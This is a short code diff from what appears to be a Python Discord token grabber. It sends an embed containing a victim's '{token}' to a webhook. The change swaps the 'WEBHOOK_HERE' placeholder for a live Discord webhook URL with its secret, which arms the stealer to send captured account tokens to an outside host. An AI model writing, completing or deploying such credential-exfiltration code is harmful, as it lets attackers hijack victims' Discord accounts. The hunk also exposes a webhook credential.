@@ -138,7 +138,7 @@ def main():
 > :joy: __Token__\n\t{token}\n
 *Made by aselterik* **|** https://github.com/aselterik """
 
-        send_to_webhook(embed_content, 'WEBHOOK_HERE')  # Replace with your webhook URL
+        send_to_webhook(embed_content, 'https://discord.com/api/webhooks/1364590196364152864/eZLty0vKpAy1otXdLBCV6DyaWFERgej0iNOAfg-QU9Btw8uW9yKZ6dO6EXOO7NwmRx1A')  # Replace with your webhook URL
 
 if __name__ == '__main__':
     main()
